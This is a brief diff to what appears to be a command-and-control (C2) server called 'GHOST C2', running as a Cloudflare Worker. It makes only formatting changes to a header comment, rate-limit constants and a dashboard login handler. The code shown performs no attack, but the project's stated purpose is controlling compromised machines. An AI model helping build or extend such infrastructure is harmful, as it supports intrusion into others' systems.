@@ -1,5 +1,5 @@
 /**
- * GHOST C2 — Cloudflare Worker (KV‑backed, encrypted)
+ * GHOST C2 — Cloudflare Worker
  *
  * - URL‑decodes session IDs (fixes pipe issue).
  * - Hostname‑derived AES‑GCM (no PSK).
@@ -84,8 +84,8 @@ const KV_RETRY_BASE_MS = 200;
 // Cloudflare Workers are stateless across instances but this protects
 // against burst attacks within a single instance lifetime.
 const RL_WINDOW_MS = 60_000;   // 1 minute window
-const RL_AUTH_MAX  = 5;        // max 5 login attempts per minute per IP
-const RL_API_MAX   = 120;      // max 120 API calls per minute per IP
+const RL_AUTH_MAX = 5;        // max 5 login attempts per minute per IP
+const RL_API_MAX = 120;      // max 120 API calls per minute per IP
 
 const _rlBuckets = new Map<string, { count: number; reset: number }>();
 
@@ -1287,7 +1287,7 @@ function geoBlock(): Response {
 // ─── Auth Handler ─────────────────────────────────────────
 
 async function handleAuth(request: Request, env: Env): Promise<Response> {
-  const body = await safeJson<{u?: string; p?: string}>(request);
+  const body = await safeJson<{ u?: string; p?: string }>(request);
   if (!body?.u || !body?.p) return errorResponse("Missing credentials", 400);
   const validUser = env.DASHBOARD_USER || "";
   const validPass = env.DASHBOARD_PASS || "";
